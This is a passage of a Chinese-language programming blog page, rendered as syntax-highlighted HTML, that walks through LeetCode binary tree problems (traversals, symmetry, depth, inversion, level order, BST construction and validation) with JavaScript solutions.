punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//先序非递归</span><span class="token keyword">var</span> arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>root<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> temp<span class="token operator">=</span>arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//这里先放右边再放左边是因为取出来的顺序相反</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//中序非递归</span><span class="token keyword">var</span> arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>root<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        root<span class="token operator">=</span>root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//找到最左结点</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> temp<span class="token operator">=</span>arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左节点为空则出栈，找出栈结点的右结点</span>    res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    root<span class="token operator">=</span>temp<span class="token punctuation">.</span>right<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//后序非递归</span><span class="token keyword">var</span> arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> p<span class="token operator">=</span>arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="相同的树"><a href="#相同的树" class="headerlink" title="相同的树"></a>相同的树</h2><p><a href="https://leetcode-cn.com/problems/same-tree/" target="_blank" rel="noopener">leetcode100</a></p><pre class=" language-js"><code class="language-js">给定两个二叉树，编写一个函数来检验它们是否相同。如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span>       <span class="token number">1</span>         <span class="token number">1</span>          <span class="token operator">/</span> \       <span class="token operator">/</span> \         <span class="token number">2</span>   <span class="token number">3</span>     <span class="token number">2</span>   <span class="token number">3</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token boolean">true</span>示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span>      <span class="token number">1</span>          <span class="token number">1</span>          <span class="token operator">/</span>           \         <span class="token number">2</span>             <span class="token number">2</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token boolean">false</span>示例 <span class="token number">3</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span>       <span class="token number">1</span>         <span class="token number">1</span>          <span class="token operator">/</span> \       <span class="token operator">/</span> \         <span class="token number">2</span>   <span class="token number">1</span>     <span class="token number">1</span>   <span class="token number">2</span>        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token boolean">false</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isSameTree <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>p <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> q <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>val <span class="token operator">!==</span> q<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token punctuation">,</span> q<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token punctuation">,</span> q<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="判断二叉树是否对称"><a href="#判断二叉树是否对称" class="headerlink" title="判断二叉树是否对称"></a>判断二叉树是否对称</h2><pre class=" language-js"><code class="language-js">给定一个二叉树，检查它是否是镜像对称的。例如，二叉树 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> 是对称的。    <span class="token number">1</span>   <span class="token operator">/</span> \  <span class="token number">2</span>   <span class="token number">2</span> <span class="token operator">/</span> \ <span class="token operator">/</span> \<span class="token number">3</span>  <span class="token number">4</span> <span class="token number">4</span>  <span class="token number">3</span>但是下面这个 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> 则不是镜像对称的<span class="token punctuation">:</span>    <span class="token number">1</span>   <span class="token operator">/</span> \  <span class="token number">2</span>   <span class="token number">2</span>   \   \   <span class="token number">3</span>    <span class="token number">3</span></code></pre><ul><li>和上题类似，把根节点拿掉，就是判断两个树的关系</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isSymmetric <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>root <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token keyword">var</span> p <span class="token operator">=</span> root<span class="token punctuation">.</span>left    <span class="token keyword">var</span> q <span class="token operator">=</span> root<span class="token punctuation">.</span>right    <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">!==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">!==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>val<span class="token operator">!==</span>q<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token punctuation">,</span>q<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token punctuation">,</span>q<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="求二叉树的深度-最大，最小"><a href="#求二叉树的深度-最大，最小" class="headerlink" title="求二叉树的深度(最大，最小)"></a>求二叉树的深度(最大，最小)</h2><pre class=" language-js"><code class="language-js">给定一个二叉树，找出其最大深度。二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。说明<span class="token punctuation">:</span> 叶子节点是指没有子节点的节点。示例：给定二叉树 <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span>，    <span class="token number">3</span>   <span class="token operator">/</span> \  <span class="token number">9</span>  <span class="token number">20</span>    <span class="token operator">/</span>  \   <span class="token number">15</span>   <span class="token number">7</span>返回它的最大深度 <span class="token number">3</span> 。</code></pre><ul><li>递归思想</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxDepth <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> leftDepth <span class="token operator">=</span> <span class="token function">maxDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span>    <span class="token keyword">let</span> rightDepth <span class="token operator">=</span> <span class="token function">maxDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>leftDepth<span class="token punctuation">,</span> rightDepth<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>给定一个二叉树，找出其最小深度。</p><p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例:</p><p>给定二叉树 [3,9,20,null,null,15,7],</p><pre class=" language-js"><code class="language-js">    <span class="token number">3</span>   <span class="token operator">/</span> \  <span class="token number">9</span>  <span class="token number">20</span>    <span class="token operator">/</span>  \   <span class="token number">15</span>   <span class="token number">7</span>返回它的最小深度  <span class="token number">2</span><span class="token punctuation">.</span></code></pre><ul><li>递归</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> minDepth <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> leftDepth <span class="token operator">=</span> <span class="token function">minDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span>    <span class="token keyword">let</span> rightDepth <span class="token operator">=</span> <span class="token function">minDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 左子树为空或者右子树为空，左子树为空返回rightDepth + 1,右子树为空返回leftDepth + 1</span>    <span class="token comment" spellcheck="true">// 直接返回 leftDepth + rightDepth + 1 即可</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> root<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> leftDepth <span class="token operator">+</span> rightDepth <span class="token operator">+</span> <span class="token number">1</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>leftDepth<span class="token punctuation">,</span> rightDepth<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="翻转二叉树"><a href="#翻转二叉树" class="headerlink" title="翻转二叉树"></a>翻转二叉树</h2><ul><li><a href="https://leetcode-cn.com/problems/invert-binary-tree/" target="_blank" rel="noopener">leetcode226</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> invertTree <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>    <span class="token keyword">let</span> tmp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> root<span class="token punctuation">.</span>right    root<span class="token punctuation">.</span>right <span class="token operator">=</span> root<span class="token punctuation">.</span>left    root<span class="token punctuation">.</span>left <span class="token operator">=</span> tmp    <span class="token function">invertTree</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span>    <span class="token function">invertTree</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span>    <span class="token keyword">return</span> root<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="二叉树的层次遍历"><a href="#二叉树的层次遍历" class="headerlink" title="二叉树的层次遍历"></a>二叉树的层次遍历</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 队列</span><span class="token keyword">var</span> levelOrderBottom <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">let</span> tmp <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>val<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>left<span class="token operator">!==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>left<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>right<span class="token operator">!==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>right<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 改变题型，输出二维数组</span><span class="token comment" spellcheck="true">// leetcode 102</span>二叉树：<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token number">3</span>   <span class="token operator">/</span> \  <span class="token number">9</span>  <span class="token number">20</span>    <span class="token operator">/</span>  \   <span class="token number">15</span>   <span class="token number">7</span>返回其层次遍历结果：<span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">var</span> levelOrder <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> len <span class="token operator">=</span> queue<span class="token punctuation">.</span>length <span class="token comment" spellcheck="true">// 一定要暂存长度，不然后面push的时候会改变queue的长度</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> node <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>val<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>        arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="有序数组转二叉搜索树"><a href="#有序数组转二叉搜索树" class="headerlink" title="有序数组转二叉搜索树"></a>有序数组转二叉搜索树</h2><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p><p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p><p>示例:</p><pre class=" language-js"><code class="language-js">给定有序数组<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span>一个可能的答案是：<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>，它可以表示下面这个高度平衡二叉搜索树：      <span class="token number">0</span>     <span class="token operator">/</span> \   <span class="token operator">-</span><span class="token number">3</span>   <span class="token number">9</span>   <span class="token regex">/   /</span> <span class="token operator">-</span><span class="token number">10</span>  <span class="token number">5</span></code></pre><ul><li>每次取中间的值作为根节点</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> sortedArrayToBST <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>    <span class="token keyword">let</span> mid <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> root<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parseInt(nums.length / 2)      =>     nums.length >> 1</span></code></pre><h2 id="验证二叉搜索树"><a href="#验证二叉搜索树" class="headerlink" title="验证二叉搜索树"></a>验证二叉搜索树</h2><ul><li><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/" target="_blank" rel="noopener">leetcode98</a></li></ul><blockquote><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p><p>假设一个二叉搜索树具有如下特征：</p><p>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isValidBST <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> inorder <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">Infinity</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">||</span> root <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token 